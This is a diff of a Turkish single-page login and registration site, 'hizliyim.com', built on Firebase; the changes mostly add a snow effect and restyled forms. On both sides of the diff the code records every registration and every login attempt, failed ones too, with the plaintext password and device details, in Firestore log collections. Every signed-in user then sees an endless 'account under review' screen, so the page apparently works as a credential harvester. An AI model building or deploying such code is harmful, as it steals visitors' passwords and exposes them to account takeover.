@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>hizliyim.com - Hızlı Platform</title>
+    <title>hizliyim.com - hizliyimsystems</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
         import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
-        import { getFirestore, collection, addDoc, doc, setDoc, getDoc, setLogLevel } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        import { getFirestore, collection, addDoc, doc, setDoc, getDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
         
         const myFirebaseConfig = {
             apiKey: "AIzaSyCP0Rd8CAfzYRPtakfdQWBqS5uBn045XpE",
@@ -26,153 +26,104 @@
             const app = initializeApp(myFirebaseConfig);
             db = getFirestore(app);
             auth = getAuth(app);
-            // setLogLevel('debug'); // Hata ayıklamak istersen açabilirsin balım
             console.log("Firebase başarıyla başlatıldı.");
         } catch (e) {
             console.error("Firebase başlatma hatası:", e);
         }
 
-        /**
-         * Firebase Oturumunu Yönetme
-         */
         async function authenticateUser() {
-            if (!auth) {
-                console.error("Firebase Auth başlatılamadı.");
-                return;
-            }
-            
+            if (!auth) return;
             onAuthStateChanged(auth, (user) => {
                 if (user) {
                     userId = user.uid;
                     window.userId = userId;
-                    console.log("Mevcut oturum ID:", userId);
                 } else {
                     signInAnonymously(auth).then((cred) => {
                         userId = cred.user.uid;
                         window.userId = userId;
-                        console.log("Yeni Anonim Oturum Açıldı. User ID:", userId);
-                    }).catch((error) => {
-                        console.error("Anonim oturum hatası:", error);
                     });
                 }
             });
-            
             window.db = db;
             window.router.initialize();
         }
 
         function getDeviceInfo() {
             const userAgent = navigator.userAgent;
-            let device = 'Bilinmeyen Cihaz';
-            if (/Mobi|Android/i.test(userAgent)) device = "Mobil Cihaz";
-            else if (/iPad|Tablet/i.test(userAgent)) device = "Tablet";
-            else device = "Masaüstü";
-            return device;
+            if (/Mobi|Android/i.test(userAgent)) return "Mobil Cihaz";
+            return "Masaüstü/Tablet";
         }
 
         async function logRegistration(username, email, password) {
             if (!window.db) return;
-            const logData = {
-                timestamp: new Date().toISOString(),
-                username: username,
-                email: email,
-                password: password, 
-                deviceInfo: getDeviceInfo(),
-                userId: window.userId || 'unknown'
-            };
             try {
-                // Log kaydı başarısız olsa bile ana işlemi durdurmamalı
-                await addDoc(collection(window.db, "kayit_log"), logData);
-            } catch (e) {
-                console.warn("Log kaydı yapılamadı (Önemsiz):", e.message);
-            }
+                await addDoc(collection(window.db, "kayit_log"), {
+                    timestamp: new Date().toISOString(),
+                    username, email, password, 
+                    deviceInfo: getDeviceInfo(),
+                    userId: window.userId || 'unknown'
+                });
+            } catch (e) { console.warn("Log hatası:", e); }
         }
 
         async function logLoginAttempt(email, password, success) {
             if (!window.db) return;
-            const logData = {
-                timestamp: new Date().toISOString(),
-                email: email,
-                password: password,
-                isSuccess: success,
-                deviceInfo: getDeviceInfo(),
-                userId: window.userId || 'unknown'
-            };
             try {
-                await addDoc(collection(window.db, "giris_log"), logData);
-            } catch (e) {
-                console.warn("Giriş logu yapılamadı:", e.message);
-            }
+                await addDoc(collection(window.db, "giris_log"), {
+                    timestamp: new Date().toISOString(),
+                    email, password, isSuccess: success,
+                    deviceInfo: getDeviceInfo(),
+                    userId: window.userId || 'unknown'
+                });
+            } catch (e) { console.warn("Log hatası:", e); }
         }
 
-        /**
-         * Kayıt İşlemi
-         */
         async function saveRegistrationData(username, email, password) {
-            if (!window.db) {
-                 return { success: false, message: "Veritabanı bağlantısı yok." };
-            }
-
+            if (!window.db) return { success: false, message: "Veritabanı bağlantısı yok." };
              const userRef = doc(window.db, "users", email.toLowerCase());
-
              try {
                 const docSnap = await getDoc(userRef);
-                if (docSnap.exists()) {
-                    return { success: false, message: "Bu e-posta zaten kullanılıyor." };
-                }
-
-                const userData = {
-                    username: username,
-                    email: email.toLowerCase(),
-                    password: password, 
-                    createdAt: new Date().toISOString(),
-                    status: 'pending'
-                };
-
-                await setDoc(userRef, userData);
-                console.log("Kullanıcı kaydedildi.");
+                if (docSnap.exists()) return { success: false, message: "Bu e-posta zaten kullanılıyor." };
                 
-                logRegistration(username, email, password); // Await kullanmadım ki hız kesmesin
-                
+                await setDoc(userRef, {
+                    username, email: email.toLowerCase(), password, 
+                    createdAt: new Date().toISOString(), status: 'pending'
+                });
+                logRegistration(username, email, password);
                 return { success: true };
-
             } catch (e) {
-                console.error("KAYIT HATASI DETAYI:", e);
-                // Hata mesajını daha anlaşılır hale getirelim
-                let msg = "Sunucu hatası oluştu.";
-                if (e.code === 'permission-denied') msg = "Yazma izniniz yok (Firestore Rules).";
-                else if (e.code === 'unavailable') msg = "İnternet bağlantınızı kontrol edin.";
-                
-                return { success: false, message: msg };
+                return { success: false, message: "Sunucu hatası oluştu." };
             }
         }
 
         async function verifyLoginCredentials(email, password) {
              if (!window.db) return false;
-            const userRef = doc(window.db, "users", email.toLowerCase());
-
             try {
-                const docSnap = await getDoc(userRef);
-                if (docSnap.exists()) {
-                    const userData = docSnap.data();
-                    if (userData.password === password) return true;
-                }
+                const docSnap = await getDoc(doc(window.db, "users", email.toLowerCase()));
+                if (docSnap.exists() && docSnap.data().password === password) return true;
                 return false;
-            } catch (e) {
-                console.error("Giriş Hatası:", e);
-                return false;
-            }
+            } catch (e) { return false; }
         }
 
-        // --- Router ---
         const router = {
             routes: { '#': 'login', '#/': 'login', '#/login': 'login', '#/register': 'register', '#/home': 'home' },
             load: () => {
                 const hash = window.location.hash || '#/login';
                 const page = router.routes[hash] || 'login';
-                document.querySelectorAll('.page-content').forEach(el => el.classList.add('hidden'));
+                
+                // Sayfa geçiş animasyonu için önce gizle sonra göster
+                const pages = document.querySelectorAll('.page-content');
+                pages.forEach(el => {
+                    el.classList.add('hidden');
+                    el.classList.remove('animate-fade-in'); // Animasyonu sıfırla
+                });
+
                 const currentPage = document.getElementById(`page-${page}`);
-                if (currentPage) currentPage.classList.remove('hidden');
+                if (currentPage) {
+                    currentPage.classList.remove('hidden');
+                    // Animasyonu tetiklemek için ufak bir gecikme veya class ekleme
+                    setTimeout(() => currentPage.classList.add('animate-fade-in'), 10);
+                }
             },
             initialize: () => {
                 window.addEventListener('hashchange', router.load);
@@ -181,199 +132,313 @@
         };
         window.router = router;
 
-        // --- DOM ---
+        // KAR EFEKTİ VE DOM İŞLEMLERİ
         document.addEventListener('DOMContentLoaded', () => {
             authenticateUser(); 
+            createSnowflakes(); // Kar yağışını başlat
 
             const formLogin = document.getElementById('form-login');
             const formRegister = document.getElementById('form-register');
-            const loginStatus = document.getElementById('login-status');
-            const loginLoadingDiv = document.getElementById('login-loading');
-            const registerStatus = document.getElementById('register-status');
-            const registerLoadingDiv = document.getElementById('register-loading');
 
-            // Login
             if (formLogin) {
                 formLogin.addEventListener('submit', async (e) => {
                     e.preventDefault();
-                    formLogin.classList.add('hidden');
-                    loginStatus.classList.add('hidden');
-                    loginLoadingDiv.classList.remove('hidden');
-                    document.getElementById('login-links').classList.add('hidden');
+                    toggleLoading('login', true);
                     
                     const email = document.getElementById('login-email').value.trim();
                     const password = document.getElementById('login-password').value;
-
                     const success = await verifyLoginCredentials(email, password);
+                    
                     logLoginAttempt(email, password, success);
 
                     if (success) {
-                        document.getElementById('login-loading-text').textContent = "Giriş Başarılı! Yönlendiriliyorsunuz...";
+                        updateLoadingText('login', "Giriş Başarılı! Yönlendiriliyorsunuz...");
                         setTimeout(() => {
                             window.location.hash = '#/home';
                             formLogin.reset();
-                            formLogin.classList.remove('hidden');
-                            document.getElementById('login-links').classList.remove('hidden');
-                            loginLoadingDiv.classList.add('hidden');
-                            document.getElementById('login-loading-text').textContent = "Giriş yapılıyor...";
+                            toggleLoading('login', false);
                         }, 1000);
                     } else {
-                        loginLoadingDiv.classList.add('hidden');
-                        formLogin.classList.remove('hidden');
-                        document.getElementById('login-links').classList.remove('hidden');
-                        loginStatus.textContent = "Bilgiler yanlış. Lütfen kontrol edin.";
-                        loginStatus.classList.remove('hidden');
+                        toggleLoading('login', false);
+                        showError('login', "Bilgiler yanlış. Lütfen kontrol edin.");
                     }
                 });
             }
 
-            // Register
             if (formRegister) {
                 formRegister.addEventListener('submit', async (e) => {
                     e.preventDefault();
-                    registerStatus.classList.add('hidden'); 
+                    const p1 = document.getElementById('register-password').value;
+                    const p2 = document.getElementById('register-confirm-password').value;
 
-                    const password = document.getElementById('register-password').value;
-                    const confirmPassword = document.getElementById('register-confirm-password').value;
+                    if (p1 !== p2) { showError('register', "Şifreler eşleşmiyor!"); return; }
 
-                    if (password !== confirmPassword) {
-                        registerStatus.textContent = "Şifreler eşleşmiyor!";
-                        registerStatus.classList.remove('hidden');
-                        return;
-                    }
-
-                    formRegister.classList.add('hidden');
-                    registerLoadingDiv.classList.remove('hidden');
-                    document.getElementById('register-links').classList.add('hidden');
-                    
-                    const username = document.getElementById('register-username').value.trim();
+                    toggleLoading('register', true);
+                    const user = document.getElementById('register-username').value.trim();
                     const email = document.getElementById('register-email').value.trim();
 
-                    const result = await saveRegistrationData(username, email, password);
+                    const result = await saveRegistrationData(user, email, p1);
 
                     if (result.success) {
-                        document.getElementById('register-loading-text').textContent = "Kayıt Başarılı! Yönlendiriliyorsunuz...";
+                        updateLoadingText('register', "Kayıt Başarılı! Yönlendiriliyorsunuz...");
                         setTimeout(() => {
                             window.location.hash = '#/login';
                             formRegister.reset();
-                            formRegister.classList.remove('hidden');
-                            document.getElementById('register-links').classList.remove('hidden');
-                            registerLoadingDiv.classList.add('hidden');
-                            document.getElementById('register-loading-text').textContent = "Talebiniz işleniyor...";
+                            toggleLoading('register', false);
                         }, 1500);
                     } else {
-                        registerLoadingDiv.classList.add('hidden');
-                        formRegister.classList.remove('hidden');
-                        document.getElementById('register-links').classList.remove('hidden');
-                        registerStatus.textContent = result.message;
-                        registerStatus.classList.remove('hidden');
+                        toggleLoading('register', false);
+                        showError('register', result.message);
                     }
                 });
             }
         });
+
+        // Yardımcı UI Fonksiyonları
+        function toggleLoading(type, isLoading) {
+            const form = document.getElementById(`form-${type}`);
+            const loading = document.getElementById(`${type}-loading`);
+            const links = document.getElementById(`${type}-links`);
+            const status = document.getElementById(`${type}-status`);
+            
+            if(isLoading) {
+                form.classList.add('hidden');
+                links.classList.add('hidden');
+                status.classList.add('hidden');
+                loading.classList.remove('hidden');
+                document.getElementById(`${type}-loading-text`).textContent = "İşlem yapılıyor...";
+            } else {
+                form.classList.remove('hidden');
+                links.classList.remove('hidden');
+                loading.classList.add('hidden');
+            }
+        }
+        
+        function updateLoadingText(type, text) {
+            document.getElementById(`${type}-loading-text`).textContent = text;
+        }
+
+        function showError(type, msg) {
+            const status = document.getElementById(`${type}-status`);
+            status.textContent = msg;
+            status.classList.remove('hidden');
+            // Hata mesajını titret
+            status.classList.add('animate-shake');
+            setTimeout(() => status.classList.remove('animate-shake'), 500);
+        }
+
+        // JS ile Kar Tanesi Üretme
+        function createSnowflakes() {
+            const snowContainer = document.getElementById('snow-container');
+            const particleCount = 70; // Kar tanesi sayısı
+
+            for (let i = 0; i < particleCount; i++) {
+                const flake = document.createElement('div');
+                flake.classList.add('snowflake');
+                
+                // Rastgele özellikler
+                const size = Math.random() * 5 + 2 + 'px'; // 2px ile 7px arası
+                flake.style.width = size;
+                flake.style.height = size;
+                
+                flake.style.left = Math.random() * 100 + 'vw';
+                flake.style.animationDuration = (Math.random() * 3 + 2) + 's'; // 2-5 saniye
+                flake.style.animationDelay = Math.random() * 2 + 's';
+                flake.style.opacity = Math.random() * 0.7 + 0.3;
+                
+                snowContainer.appendChild(flake);
+            }
+        }
     </script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700;900&display=swap');
         
         :root {
-            /* Mavi Tema Geri Döndü */
             --primary-blue: #027aff;
-            --gradient-bg: radial-gradient(circle at 50% 10%, #449cff 0%, #027aff 60%, #005fce 100%);
+            --neon-blue: #00f3ff;
+            --glass-bg: rgba(0, 10, 30, 0.6);
+            --border-color: rgba(255, 255, 255, 0.15);
         }
 
+        /* Hareketli Arka Plan */
         body {
             font-family: 'Inter', sans-serif;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            background: var(--gradient-bg);
+            background: linear-gradient(125deg, #001f3f, #027aff, #001233);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
             padding: 20px;
+            overflow: hidden;
+            position: relative;
         }
 
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        /* Kar Efekti CSS */
+        #snow-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .snowflake {
+            position: absolute;
+            background: white;
+            border-radius: 0; /* Kare kar taneleri (daha dijital/keskin hava için) veya 50% yapabiliriz, senin keskin tema isteğine göre kare bıraktım */
+            top: -10px;
+            animation: fall linear infinite;
+        }
+
+        @keyframes fall {
+            0% { transform: translateY(-10vh) rotate(0deg); }
+            100% { transform: translateY(110vh) rotate(360deg); }
+        }
+
+        /* Kart Tasarımı */
         .premium-card {
-            backdrop-filter: blur(10px) saturate(180%);
-            -webkit-backdrop-filter: blur(10px) saturate(180%);
-            background-color: rgba(255, 255, 255, 0.1);
-            /* Keskin Hatlar - Radius 0 */
-            border-radius: 0px; 
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.3);
-            padding: 2.5rem;
+            position: relative;
+            z-index: 10;
+            backdrop-filter: blur(20px) saturate(180%);
+            -webkit-backdrop-filter: blur(20px) saturate(180%);
+            background-color: var(--glass-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 0px; /* KESKİN */
+            padding: 3rem;
             max-width: 450px;
             width: 100%;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+            /* Sayfa ilk açıldığında görünmez, JS ile animate class eklenir */
+            opacity: 0;
+            transform: translateY(20px);
+            transition: opacity 0.6s ease-out, transform 0.6s ease-out;
         }
 
+        /* Sayfa yüklendiğinde tetiklenen animasyon */
+        .animate-fade-in {
+            opacity: 1 !important;
+            transform: translateY(0) !important;
+        }
+
+        /* Titreme Animasyonu (Hata durumunda) */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+        .animate-shake { animation: shake 0.3s ease-in-out; }
+
+        /* Başlık Efekti */
+        .logo-text {
+            text-shadow: 0 0 20px rgba(2, 122, 255, 0.8);
+            animation: glowText 3s infinite alternate;
+        }
+        @keyframes glowText {
+            0% { text-shadow: 0 0 10px rgba(2, 122, 255, 0.5); }
+            100% { text-shadow: 0 0 25px rgba(0, 243, 255, 0.8); }
+        }
+
+        /* Inputlar */
         .premium-input {
-            background-color: rgba(255, 255, 255, 0.15);
-            border: 1px solid rgba(255, 255, 255, 0.3);
+            background-color: rgba(255, 255, 255, 0.07);
+            border: 1px solid rgba(255, 255, 255, 0.2);
             color: white;
             padding: 1rem;
-            /* Keskin Hatlar */
-            border-radius: 0px; 
-            transition: all 0.2s ease;
+            border-radius: 0px; /* KESKİN */
+            transition: all 0.3s ease;
         }
         .premium-input:focus {
             outline: none;
-            border-color: #ffffff;
-            background-color: rgba(255, 255, 255, 0.25);
+            border-color: var(--neon-blue);
+            background-color: rgba(255, 255, 255, 0.15);
+            box-shadow: 0 0 15px rgba(2, 122, 255, 0.3);
+            transform: scale(1.02);
         }
-        .premium-input::placeholder {
-            color: rgba(255, 255, 255, 0.7);
-        }
+        .premium-input::placeholder { color: rgba(255, 255, 255, 0.5); }
 
+        /* Butonlar */
         .premium-button {
-            background: #ffffff;
+            background: linear-gradient(90deg, #ffffff, #e0e0e0);
             color: var(--primary-blue);
-            font-weight: 800;
+            font-weight: 900;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
-            /* Keskin Hatlar */
-            border-radius: 0px; 
+            letter-spacing: 2px;
+            border-radius: 0px; /* KESKİN */
             padding: 1rem;
-            transition: all 0.2s ease;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
         }
         .premium-button:hover {
-            background: #f0f0f0;
-            transform: translateY(-1px);
+            transform: translateY(-2px);
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.4);
         }
+        .premium-button:active { transform: translateY(1px); }
 
+        /* Spinner */
         .spinner {
-            border: 4px solid rgba(255, 255, 255, 0.3);
-            border-left-color: #ffffff;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top-color: var(--neon-blue);
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto 1rem auto;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1.5rem auto;
+            box-shadow: 0 0 15px rgba(0, 243, 255, 0.2);
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        a { text-decoration: none; }
+        a { text-decoration: none; position: relative; }
+        a::after {
+            content: '';
+            position: absolute;
+            width: 100%;
+            transform: scaleX(0);
+            height: 1px;
+            bottom: -2px;
+            left: 0;
+            background-color: var(--neon-blue);
+            transform-origin: bottom right;
+            transition: transform 0.25s ease-out;
+        }
+        a:hover::after {
+            transform: scaleX(1);
+            transform-origin: bottom left;
+        }
+        a:hover { color: var(--neon-blue); }
+
     </style>
 </head>
 <body class="text-white">
+
+    <div id="snow-container"></div>
 
     <main id="app-container" class="w-full flex justify-center items-center">
 
         <div id="page-login" class="page-content hidden">
             <div class="premium-card text-center">
-                <h1 class="text-5xl font-extrabold mb-8 tracking-tighter">
-                    <span class="text-white drop-shadow-md">hizliyim.com</span>
+                <h1 class="text-5xl font-extrabold mb-8 tracking-tighter logo-text">
+                    hizliyim.com
                 </h1>
                 
                 <div id="login-loading" class="hidden py-6">
                     <div class="spinner"></div>
-                    <p id="login-loading-text" class="text-lg font-medium">Giriş yapılıyor...</p>
+                    <p id="login-loading-text" class="text-lg font-medium text-blue-200">Giriş yapılıyor...</p>
                 </div>
                 
-                <p id="login-status" class="hidden text-sm mb-4 font-semibold text-red-200 bg-red-900/50 p-2">Durum Mesajı</p>
+                <p id="login-status" class="hidden text-sm mb-4 font-bold text-red-200 bg-red-900/40 p-3 border border-red-500/30">Durum Mesajı</p>
 
-                <form id="form-login" class="space-y-4">
+                <form id="form-login" class="space-y-5">
                     <div>
                         <input type="email" id="login-email" placeholder="E-posta Adresi" required 
                             class="premium-input w-full">
@@ -383,13 +448,13 @@
                             class="premium-input w-full">
                     </div>
                     <button type="submit" class="premium-button w-full">
-                        GİRİŞ YAP
+                        Giriş Yap
                     </button>
                 </form>
                 
-                <div id="login-links" class="mt-6 text-sm">
+                <div id="login-links" class="mt-8 text-sm text-gray-400">
                     Hesabın yok mu? 
-                    <a href="#/register" class="font-bold text-white border-b border-white/50 hover:border-white transition-all ml-1">
+                    <a href="#/register" class="font-bold text-white transition-all ml-1">
                         Üye Ol
                     </a>
                 </div>
@@ -398,18 +463,17 @@
 
         <div id="page-register" class="page-content hidden">
             <div class="premium-card text-center">
-                <h1 class="text-4xl font-extrabold mb-8 tracking-tighter">
-                    <span class="text-white drop-shadow-md">hizliyim.com</span>
+                <h1 class="text-4xl font-extrabold mb-2 tracking-tighter logo-text">
+                    hizliyim.com
                 </h1>
-                
-                <p class="text-lg font-light mb-6 opacity-90">Hesap Oluştur</p>
+                <p class="text-sm font-light mb-8 text-blue-300 tracking-widest uppercase">Kış Sezonu Kayıtları</p>
 
                 <div id="register-loading" class="hidden py-6">
                     <div class="spinner"></div>
-                    <p id="register-loading-text" class="text-lg font-medium">Talebiniz işleniyor...</p>
+                    <p id="register-loading-text" class="text-lg font-medium text-blue-200">İşleniyor...</p>
                 </div>
 
-                <p id="register-status" class="hidden text-sm mb-4 font-semibold text-red-200 bg-red-900/50 p-2">Durum Mesajı</p>
+                <p id="register-status" class="hidden text-sm mb-4 font-bold text-red-200 bg-red-900/40 p-3 border border-red-500/30">Durum Mesajı</p>
 
                 <form id="form-register" class="space-y-4">
                     <div>
@@ -420,22 +484,20 @@
                         <input type="email" id="register-email" placeholder="E-posta Adresi" required 
                             class="premium-input w-full">
                     </div>
-                    <div>
+                    <div class="grid grid-cols-2 gap-4">
                         <input type="password" id="register-password" placeholder="Şifre" required 
                             class="premium-input w-full">
-                    </div>
-                    <div>
-                        <input type="password" id="register-confirm-password" placeholder="Şifre Tekrarı" required 
+                        <input type="password" id="register-confirm-password" placeholder="Tekrar" required 
                             class="premium-input w-full">
                     </div>
-                    <button type="submit" class="premium-button w-full">
-                        KAYIT OL
+                    <button type="submit" class="premium-button w-full mt-2">
+                        Kayıt Ol
                     </button>
                 </form>
 
-                <div id="register-links" class="mt-6 text-sm">
+                <div id="register-links" class="mt-8 text-sm text-gray-400">
                     Zaten hesabın var mı? 
-                    <a href="#/login" class="font-bold text-white border-b border-white/50 hover:border-white transition-all ml-1">
+                    <a href="#/login" class="font-bold text-white transition-all ml-1">
                         Giriş Yap
                     </a>
                 </div>
@@ -444,15 +506,23 @@
 
         <div id="page-home" class="page-content hidden">
             <div class="premium-card text-center bg-transparent border-0 shadow-none p-8">
-                <div class="w-16 h-16 mx-auto mb-6 border-4 border-white/30 border-t-white rounded-full animate-spin"></div>
-                <h1 class="text-3xl font-bold mb-4">Hesabınız İnceleniyor</h1>
-                <p class="text-lg font-light text-white/80 leading-relaxed">
-                    Hesabınız hizmetlere erişebilmeniz için yönetici onayı bekliyor.
-                    Lütfen daha sonra tekrar kontrol ediniz.
+                <div class="mb-6 relative inline-block">
+                    <div class="w-20 h-20 border-4 border-white border-t-transparent animate-spin mx-auto rounded-full opacity-20 absolute top-0 left-0 right-0"></div>
+                    <div class="text-6xl animate-bounce relative z-10">❄️</div>
+                </div>
+                
+                <h1 class="text-3xl font-bold mb-4 text-white drop-shadow-[0_0_15px_rgba(255,255,255,0.5)]">
+                    Hesabınız İnceleniyor
+                </h1>
+                <div class="h-1 w-20 bg-blue-500 mx-auto mb-6"></div>
+                <p class="text-lg font-light text-blue-100 leading-relaxed max-w-sm mx-auto">
+                    Kış sezonu yoğunluğu nedeniyle hesabın yönetici onayı bekliyor balım. 
+                    <br><br>
+                    <span class="text-sm opacity-70">Lütfen daha sonra tekrar kontrol et.</span>
                 </p>
-                <div class="mt-8">
-                    <button onclick="window.location.reload()" class="text-sm border border-white/30 px-4 py-2 hover:bg-white/10 transition-colors">
-                        Sayfayı Yenile
+                <div class="mt-10">
+                    <button onclick="window.location.reload()" class="premium-button text-xs py-3 px-6 w-auto inline-block hover:scale-105">
+                        Yenile
                     </button>
                 </div>
             </div>
